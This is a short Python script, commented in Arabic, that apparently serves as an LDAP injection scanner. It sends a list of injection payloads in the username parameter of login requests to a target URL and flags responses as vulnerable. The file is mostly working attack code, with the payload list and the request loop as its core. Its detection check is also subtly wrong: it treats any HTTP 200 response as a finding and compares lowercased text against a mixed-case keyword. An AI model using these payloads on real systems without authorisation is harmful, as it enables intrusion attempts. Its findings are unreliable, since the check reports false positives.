"""
LDAP Injection Scanner
يفحص ثغرات LDAP Injection
"""

import requests
import urllib.parse
from typing import List, Dict

class LDAPInjectionScanner:
    
    def __init__(self, target: str):
        self.target = target
        self.vulnerabilities = []
        
        # Payloads
        self.payloads = [
            "*",
            "*)",
            "*)(&",
            "*))%00",
            "admin)(&",
            "admin)(!(&(|",
            "*()|%26",
            "*)(|(*",
            "*)(&(objectClass=*)",
        ]
    
    def scan(self) -> List[Dict]:
        """الفحص الرئيسي"""
        print(f"[+] فحص LDAP Injection: {self.target}")
        
        for payload in self.payloads:
            try:
                url = f"{self.target}?username={urllib.parse.quote(payload)}&password=test"
                response = requests.get(url, timeout=10)
                
                if self._check_ldap_injection(response):
                    self.vulnerabilities.append({
                        'type': 'LDAP Injection',
                        'severity': 'high',
                        'url': url,
                        'payload': payload,
                        'evidence': response.text[:200]
                    })
                    print(f"  [!] LDAP Injection وُجدت! Payload: {payload}")
                    return self.vulnerabilities
            except:
                pass
        
        return self.vulnerabilities
    
    def _check_ldap_injection(self, response) -> bool:
        """فحص نجاح LDAP Injection"""
        indicators = [
            'ldap',
            'directory',
            'authenticated',
            'dn=',
            'cn=',
            'objectClass'
        ]
        
        text = response.text.lower()
        return any(indicator in text for indicator in indicators) or response.status_code == 200
